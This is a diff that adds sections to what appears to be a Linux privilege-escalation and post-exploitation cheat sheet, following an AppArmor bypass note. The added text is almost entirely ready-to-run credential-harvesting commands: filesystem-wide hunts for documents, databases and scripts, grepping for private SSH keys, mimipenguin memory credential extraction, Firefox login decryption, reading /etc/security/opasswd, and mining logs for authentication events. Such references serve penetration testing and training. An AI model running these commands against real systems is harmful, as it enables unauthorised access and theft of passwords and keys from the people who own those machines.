@@ -3102,3 +3102,61 @@ chmod +x /tmp/privesc.pl
 ```
 
 This works because when Linux loads an executable script with `#!/usr/bin/perl`, the AppArmor profile for `/usr/bin/perl` is not applied to that execution context.
+
+---
+
+### Hunting for Encrypted Files
+
+```bash
+for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+```
+
+### Hunting for SSH Keys
+
+```bash
+grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
+```
+
+### Check if SSH Key is Encrypted
+
+```bash
+ssh-keygen -yf ~/.ssh/id_ed25519
+ssh-keygen -yf ~/.ssh/id_rsa
+```
+
+### Mimipenguin (Linux Credential Extraction)
+
+```bash
+sudo python3 mimipenguin.py
+```
+
+### Firefox Credential Decryption
+
+```bash
+cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
+python3.9 firefox_decrypt.py
+```
+
+### Old Passwords (opasswd)
+
+```bash
+sudo cat /etc/security/opasswd
+```
+
+### Search Databases
+
+```bash
+for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
+```
+
+### Search Scripts
+
+```bash
+for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+```
+
+### Search Log Files for Credentials
+
+```bash
+for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
+```
